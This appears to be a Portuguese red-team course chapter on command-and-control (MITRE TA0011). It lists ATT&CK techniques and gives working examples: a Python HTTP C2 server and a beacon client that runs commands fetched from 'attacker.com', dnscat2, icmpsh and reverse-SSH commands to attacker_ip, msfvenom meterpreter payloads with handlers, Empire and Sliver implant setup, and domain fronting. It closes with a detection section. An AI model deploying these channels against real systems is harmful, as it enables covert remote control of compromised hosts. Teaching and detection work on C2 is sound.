# 12 - Comando e Controle (C2)

**MITRE ATT&CK Tactic:** [TA0011 - Command and Control](https://attack.mitre.org/tactics/TA0011/)

## 📖 Sobre

Técnicas para **comunicação com sistemas comprometidos** e **controlar remotamente** o ambiente. Estabelecer canais de comando e controle.

## 🎯 Objetivo

Manter comunicação persistente e furtiva com sistemas comprometidos para enviar comandos e receber dados.

## 📚 Técnicas Principais

### T1071 - Application Layer Protocol
- **T1071.001** - Web Protocols (HTTP/HTTPS)
- **T1071.002** - File Transfer Protocols (FTP, FTPS)
- **T1071.003** - Mail Protocols (SMTP, POP3, IMAP)
- **T1071.004** - DNS

### T1092 - Communication Through Removable Media
- USB drops
- Air-gap bypass

### T1132 - Data Encoding
- **T1132.001** - Standard Encoding (Base64, hex)
- **T1132.002** - Non-Standard Encoding
- Ofuscar comunicação

### T1001 - Data Obfuscation
- **T1001.001** - Junk Data
- **T1001.002** - Steganography
- **T1001.003** - Protocol Impersonation

### T1568 - Dynamic Resolution
- **T1568.001** - Fast Flux DNS
- **T1568.002** - Domain Generation Algorithms (DGA)
- **T1568.003** - DNS Calculation

### T1573 - Encrypted Channel
- **T1573.001** - Symmetric Cryptography
- **T1573.002** - Asymmetric Cryptography
- SSL/TLS tunneling

### T1008 - Fallback Channels
- Canais de backup C2
- Múltiplos servidores C2

### T1105 - Ingress Tool Transfer
- Download de ferramentas
- Staging de payloads

### T1104 - Multi-Stage Channels
- Comunicação multi-estágio
- Proxies intermediários

### T1095 - Non-Application Layer Protocol
- TCP/UDP raw
- ICMP tunneling

### T1572 - Protocol Tunneling
- SSH tunneling
- VPN
- Encapsulamento de protocolos

### T1090 - Proxy
- **T1090.001** - Internal Proxy
- **T1090.002** - External Proxy
- **T1090.003** - Multi-hop Proxy
- **T1090.004** - Domain Fronting

### T1219 - Remote Access Software
- TeamViewer, AnyDesk
- VNC, RDP
- Legit remote tools

### T1205 - Traffic Signaling
- **T1205.001** - Port Knocking
- **T1205.002** - Socket Filters
- Triggers para ativar C2

### T1102 - Web Service
- **T1102.001** - Dead Drop Resolver
- **T1102.002** - Bidirectional Communication
- Usar serviços legítimos (Pastebin, GitHub, Twitter)

## 🛠️ Protocolos de C2

### HTTP/HTTPS C2
```python
# Simple HTTP C2 - Server
from http.server import BaseHTTPRequestHandler, HTTPServer

class C2Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        cmd = "whoami"  # comando a enviar
        self.wfile.write(cmd.encode())
    
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        output = self.rfile.read(content_length)
        print(f"Output: {output.decode()}")
        self.send_response(200)
        self.end_headers()

HTTPServer(('0.0.0.0', 8080), C2Handler).serve_forever()
```
```python
# Simple HTTP C2 - Client
import requests
import subprocess
import time

C2_SERVER = "http://attacker.com:8080"

while True:
    try:
        # Get command
        response = requests.get(C2_SERVER)
        cmd = response.text
        
        # Execute
        output = subprocess.getoutput(cmd)
        
        # Send result back
        requests.post(C2_SERVER, data=output)
        
    except:
        pass
    
    time.sleep(60)  # Beacon every 60s
```

### DNS C2
```bash
# DNS tunneling com dnscat2
# Server
dnscat2 --dns "domain=example.com,host=0.0.0.0,port=53"

# Client
./dnscat --dns server=attacker.com,domain=example.com
```

### ICMP C2
```bash
# icmpsh
# Server
python icmpsh_m.py attacker_ip target_ip

# Client (Windows)
icmpsh.exe -t attacker_ip
```

### Reverse SSH
```bash
# Target connects back to attacker
ssh -R 2222:localhost:22 attacker@attacker_ip

# Attacker can now SSH to target
ssh -p 2222 target_user@localhost
```

## 🛠️ Frameworks C2

### Metasploit Framework
```bash
# Generate payload
msfvenom -p windows/meterpreter/reverse_https LHOST=attacker_ip LPORT=443 -f exe -o payload.exe

# Handler
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_https
set LHOST attacker_ip
set LPORT 443
exploit
```

### PowerShell Empire / Starkiller
```bash
# Start Empire
./ps-empire server
./ps-empire client

# Create listener
listeners
uselistener http
set Host http://attacker_ip:8080
execute

# Generate stager
usestager windows/launcher_bat
set Listener http
execute
```

### Covenant
```bash
# Start Covenant
dotnet run --project Covenant

# Access Web UI: https://localhost:7443
# Create Listener
# Generate Launcher
# Execute on target
```

### Sliver
```bash
# Start Sliver
sliver-server

# Generate implant
generate --http attacker_ip --save /tmp/payload.exe

# Start HTTP listener
http

# Interact with session
sessions
use <session-id>
```

### Cobalt Strike (Comercial)
```bash
# Team server
./teamserver <IP> <password>

# Connect client
./cobaltstrike

# Create listener (HTTP/HTTPS/DNS)
# Generate payload
# Post-exploitation
```

## 🛠️ Técnicas Avançadas de C2

### Domain Fronting
```python
# Use CDN (CloudFront, CloudFlare) como proxy
# Request vai para CDN mas é roteado para C2 real
import requests

headers = {
    'Host': 'real-c2-domain.com'  # Hidden domain
}

response = requests.get('https://cdn-domain.com', headers=headers)
```

### DNS over HTTPS (DoH) C2
```python
# Usar DoH para C2 furtivo
import requests

doh_server = "https://1.1.1.1/dns-query"
domain = "command.attacker.com"

response = requests.get(
    doh_server,
    params={'name': domain, 'type': 'TXT'},
    headers={'Accept': 'application/dns-json'}
)

# Parse TXT record for command
```

### Steganography C2
```python
# Esconder comandos em imagens
from PIL import Image
import numpy as np

# Encode
img = Image.open('cat.png')
data = np.array(img)
# Modify LSB to hide data
# Save image

# Upload to legitimate service (imgur, etc)
# Target downloads, extracts command
```

### Dead Drop Resolver
```python
# Usar serviços legítimos como dead drop
import requests

# Pastebin, GitHub Gist, Twitter, etc
pastebin_url = "https://pastebin.com/raw/XXXXXXXX"
response = requests.get(pastebin_url)
c2_server = response.text.strip()

# Now connect to real C2
```

## 🎓 Labs Práticos

- [ ] Setup Metasploit handler e reverse shell
- [ ] Configurar PowerShell Empire listener
- [ ] DNS C2 com dnscat2
- [ ] HTTP C2 custom em Python
- [ ] ICMP tunneling
- [ ] SSH reverse tunnel
- [ ] Domain fronting básico
- [ ] Dead drop resolver com Pastebin

## 🛠️ Ferramentas C2

### Open Source
- **Metasploit Framework**
- **PowerShell Empire / Starkiller**
- **Covenant** (.NET C2)
- **Sliver** (Go implants)
- **Merlin** (HTTP/2 C2)
- **Mythic** (Multi-agent C2)
- **PoshC2** (Python/PowerShell)

### Tunneling
- **dnscat2** - DNS tunnel
- **iodine** - DNS tunnel
- **icmpsh** - ICMP tunnel
- **Chisel** - TCP/UDP tunnel
- **reGeorg** - SOCKS proxy via webshell

### Proxy/Pivoting
- **proxychains** - SOCKS proxy
- **sshuttle** - VPN over SSH
- **ligolo** - Reverse tunneling tool

## 🔍 Detecção de C2

### Indicadores de Rede
- Beacons regulares (mesmo intervalo)
- Conexões para IPs/domínios suspeitos
- DNS queries anormais
- Tráfego criptografado não esperado
- High entropy data
- Domain Generation Algorithm patterns
- Long-duration connections

### Análise de Tráfego
```
- JA3/JA3S fingerprinting (TLS)
- Beacon analysis (timing patterns)
- DNS tunneling indicators
- ICMP traffic anômalo
- HTTP User-Agent suspeitos
- Certificate anomalies
```

### Ferramentas de Detecção
- **Zeek (Bro)** - Network monitoring
- **Suricata** - IDS/IPS
- **RITA** - Beacon detection
- **Wireshark** - Packet analysis
- **NetworkMiner** - PCAP analysis

## 📚 Recursos

- [C2 Matrix](https://www.thec2matrix.com/) - Comparação de frameworks
- [MITRE ATT&CK - C2](https://attack.mitre.org/tactics/TA0011/)
- [Awesome C2](https://github.com/Qazeer/awesome-c2) - Lista de frameworks
- [HackTricks - C2](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells)
- [Red Team Infrastructure Wiki](https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki)

---

**Anterior:** [11-Coleta](../11-Coleta/) | **Próximo:** [13-ExfiltImpacto](../13-ExfiltImpacto/)